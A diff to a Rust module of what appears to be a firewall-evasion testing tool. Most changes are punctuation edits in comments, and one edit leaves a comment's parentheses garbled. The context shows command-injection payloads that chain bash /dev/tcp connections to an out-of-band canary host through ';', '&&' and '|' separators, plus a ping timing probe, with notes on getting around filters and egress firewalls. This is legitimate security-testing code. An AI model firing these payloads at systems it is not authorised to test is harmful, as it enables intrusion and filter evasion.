@@ -21,7 +21,7 @@ pub fn embed_canary(payload: &str, canary: &OobCanary, payload_type: &str) -> St
 
 // ─── Battery helpers (interactsh-provider feature) ─────────────────────────
 //
-// `embed_canary` returns one template per payload type — what wafrift
+// `embed_canary` returns one template per payload type, what wafrift
 // has always done. That's fine when the caller wants a single
 // emission-per-canary, but a single template loses against any sink
 // that filters that one template's tag/separator/protocol. The new
@@ -82,7 +82,7 @@ pub fn embed_blind_sqli_battery(
         // SqliDialect is `#[non_exhaustive]` to absorb future
         // dialects (SQLite, ClickHouse, …) without forcing
         // consumers to recompile. Default new variants to the
-        // full HTTP URL form — that is what every dialect added
+        // full HTTP URL form, that is what every dialect added
         // since UTL_HTTP has settled on.
         _ => canary_http_url(canary),
     };
@@ -96,13 +96,13 @@ pub fn embed_blind_sqli_battery(
 /// curl / wget / short-ping / PowerShell with five separator variants.
 /// wafrift adds two protocol-orthogonal channels on top:
 ///
-/// - `/dev/tcp/host/port` — bash's built-in TCP socket that needs no
+/// - `/dev/tcp/host/port`: bash's built-in TCP socket that needs no
 ///   external binary (curl/wget/nc/nslookup may all be filtered or
 ///   missing inside a minimal container; bash itself opens the socket).
 ///   The HTTP collector listens on the canary's port, so a TCP connect
-///   alone — no HTTP request needed — surfaces the interaction.
+///   alone (no HTTP request needed (surfaces the interaction)).
 ///
-/// - long-ping timing channel — `ping -c 10` produces a deterministic
+/// - long-ping timing channel: `ping -c 10` produces a deterministic
 ///   9-second delay even when the WAF strips DNS-callback bytes from
 ///   the response and the egress firewall blocks every outbound
 ///   protocol. Latency delta vs a calibration request becomes the
@@ -113,7 +113,7 @@ pub fn embed_blind_sqli_battery(
 pub fn embed_blind_cmdi_battery(canary: &OobCanary) -> Vec<String> {
     let mut out = interactsh::blind_cmdi_payloads(&canary.expected_dns);
     let dns = &canary.expected_dns;
-    // bash /dev/tcp — connect-only confirmation, three separator
+    // bash /dev/tcp, connect-only confirmation, three separator
     // variants so a filter rejecting `;` still gets caught by `&&`
     // or `|`. The `cat` write is harmless (the canary's TCP listener
     // accepts and discards bytes); the connect itself is the signal.
@@ -122,7 +122,7 @@ pub fn embed_blind_cmdi_battery(canary: &OobCanary) -> Vec<String> {
         "&& bash -c 'echo probe >/dev/tcp/{dns}/80' 2>/dev/null"
     ));
     out.push(format!("| bash -c ':>/dev/tcp/{dns}/80' 2>/dev/null"));
-    // Long-ping timing channel — pad count so the delay is
+    // Long-ping timing channel, pad count so the delay is
     // unmistakable against typical 200 ms request latency. -c 10 on
     // a 1-second-interval ping gives ~9 s of delay.
     out.push(format!("; ping -c 10 127.0.0.1"));
@@ -223,7 +223,7 @@ mod battery_tests {
         let canary = make_canary();
         let battery = embed_blind_cmdi_battery(&canary);
         // Each variant must carry one of: the canary DNS (exfil),
-        // a localhost ping (timing channel — no DNS needed by design),
+        // a localhost ping (timing channel, no DNS needed by design),
         // or a /dev/tcp socket reference (bash builtin TCP).
         for v in &battery {
             let has_dns = v.contains(&canary.expected_dns);
